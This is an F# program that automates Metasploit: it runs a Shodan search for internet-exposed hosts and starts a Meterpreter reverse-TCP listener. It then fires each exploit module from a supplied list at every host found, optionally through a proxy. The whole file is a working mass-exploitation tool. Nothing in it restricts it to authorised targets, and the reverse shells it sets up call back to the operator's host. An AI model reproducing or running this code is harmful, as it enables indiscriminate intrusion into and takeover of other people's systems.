open System
open System.IO
open System.Diagnostics

module Program =

    // Function to execute Metasploit commands, filter out the banner, and display the rest of the output
    let runMetasploitCommand (command: string) (logFilePath: string) =
        let startInfo = new ProcessStartInfo()
        startInfo.FileName <- "/bin/bash"
        startInfo.Arguments <- sprintf "-c \"msfconsole -x '%s'\"" command
        startInfo.RedirectStandardOutput <- true
        startInfo.RedirectStandardError <- true
        startInfo.UseShellExecute <- false
        startInfo.CreateNoWindow <- true

        let proc = new Process()
        proc.StartInfo <- startInfo
        proc.Start() |> ignore

        let output = proc.StandardOutput.ReadToEnd()
        let errorOutput = proc.StandardError.ReadToEnd()

        proc.WaitForExit()

        // Write all output to log.txt
        File.AppendAllText(logFilePath, output)

        // Filter the output to exclude the Metasploit banner
        let lines = output.Split('\n')
        let mutable inBanner = false

        lines
        |> Array.iter (fun line ->
            let trimmedLine = line.Trim()

            // Detect the start and end of the Metasploit banner
            if trimmedLine.StartsWith("Metasploit tip:") then
                inBanner <- true

            // Print lines that are not within the banner
            if not inBanner then
                printfn "%s" line

            // End banner detection when the documentation line appears
            if trimmedLine.StartsWith("Metasploit Documentation:") then
                inBanner <- false
        )

        // Display any errors if present
        if proc.ExitCode <> 0 then
            printfn "Error executing command: %s" errorOutput

    // Function to get user input (for reusability)
    let getUserInput prompt =
        printf "%s" prompt
        Console.ReadLine()

    // Function to configure the proxy (if required) and return the setg command string
    let configureProxy logFilePath =
        let useProxy = getUserInput "Do you want to use a proxy? (Y/N): "
        if useProxy.ToUpper() = "Y" then
            let proxyType = getUserInput "Enter the proxy type (socks4/socks5/http): "
            let proxyHostPort = getUserInput "Enter the proxy host and port in format host:port: "
            let proxyCommand = sprintf "setg proxies %s:%s" proxyType proxyHostPort
            runMetasploitCommand proxyCommand logFilePath
            Some (sprintf "setg proxies %s:%s" proxyType proxyHostPort) // Return the proxy command to use it later
        else
            printfn "No proxy configured."
            None // No proxy to set later

    // Start multi-handler listener
    let startMultiHandler lhost lport logFilePath =
        let command = sprintf "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; run -j; exit" lhost lport
        runMetasploitCommand command logFilePath

    // Run the Shodan search and write only IP:Port results to a file
    let executeShodanSearch apiKey query maxPage logFilePath =
        let resultsFile = "results.txt" // Create results file in current directory

        // Create or overwrite results.txt
        File.WriteAllText(resultsFile, "") // Initialize the file

        // Run the Shodan search, output to results.txt, and set max page
        let command = sprintf "use auxiliary/gather/shodan_search; set SHODAN_APIKEY %s; set QUERY '%s'; set OUTFILE %s; set maxpage %s; run; exit" apiKey query resultsFile maxPage
        runMetasploitCommand command logFilePath

        // After running the search, clean up the results to keep only the IP:Port lines
        let allResults = File.ReadAllLines(resultsFile)
        let filteredResults = 
            allResults
            |> Array.choose (fun line ->
                let trimmedLine = line.Trim()
                if trimmedLine.Contains(":") && not (trimmedLine.StartsWith("IP:")) then
                    let ipPort = trimmedLine.Split(' ').[0] // Get the first column which contains IP:Port
                    Some ipPort
                else
                    None // Skip lines that don't contain IP:Port
            )
        
        // Overwrite results.txt with only IP:Port lines
        File.WriteAllLines(resultsFile, filteredResults)

    // Parse the IP and Port from results.txt
    let parseResults () =
        let resultsFile = "results.txt" // Use the created results file
        if File.Exists(resultsFile) then
            let results = File.ReadAllLines(resultsFile)
            results
            |> Array.choose (fun line ->
                let parts = line.Split(':')
                if parts.Length >= 2 then
                    let ip = parts.[0]
                    let port = parts.[1]
                    Some (ip, port) // Return valid tuple (ip, port)
                else
                    None // Skip malformed lines
            )
        else
            printfn "Error: Results file not found."
            [||] // Return an empty array if the file is missing

    // Load vulnerability modules
    let loadModules modulesPath =
        File.ReadAllLines(modulesPath)

    // Run the modules
    let runModules (modules: string[]) (ipsAndPorts: (string * string)[]) lhost lport logFilePath proxyCommand =
        for (ip, port) in ipsAndPorts do
            printfn "Running modules on %s:%s" ip port
            for moduleName in modules do
                // Add proxy command before each module execution if a proxy is set
                let command =
                    match proxyCommand with
                    | Some proxyCmd -> sprintf "%s; use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" proxyCmd moduleName ip port lhost lport
                    | None -> sprintf "use %s; set RHOST %s; set RPORT %s; set LHOST %s; set LPORT %s; run; exit" moduleName ip port lhost lport
                runMetasploitCommand command logFilePath

    // Main function
    [<EntryPoint>]
    let main argv =
        // Step 0: Gather all inputs upfront
        let apiKey = getUserInput "Enter your Shodan API Key: "
        let query = getUserInput "Enter the Shodan Query to Search: "
        let maxPage = getUserInput "Enter the maximum number of Shodan pages to scan: "
        let modulesPath = getUserInput "Enter the location of your modules list to test: "
        let lhost = getUserInput "Enter your LHOST value (your local IP): "
        let lport = getUserInput "Enter your LPORT value (the port to listen on): "
        let logFilePath = "log.txt" // Define the log file path

        // Initialize log.txt
        File.WriteAllText(logFilePath, "")

        // Step 1: Configure proxy if needed
        let proxyCommand = configureProxy logFilePath

        // Step 2: Run Shodan search and create results file
        printfn "Running Shodan search..."
        executeShodanSearch apiKey query maxPage logFilePath

        // Step 3: Parse Shodan results from results.txt
        let ipsAndPorts = parseResults()

        // Step 4: Load vulnerability modules from the provided path
        let modules = loadModules modulesPath

        // Step 5: Start multi-handler
        printfn "Starting multi-handler with LHOST = %s and LPORT = %s..." lhost lport
        startMultiHandler lhost lport logFilePath

        // Step 6: Run modules on IPs and ports, with proxy if set
        runModules modules ipsAndPorts lhost lport logFilePath proxyCommand

        // Exit successfully
        0
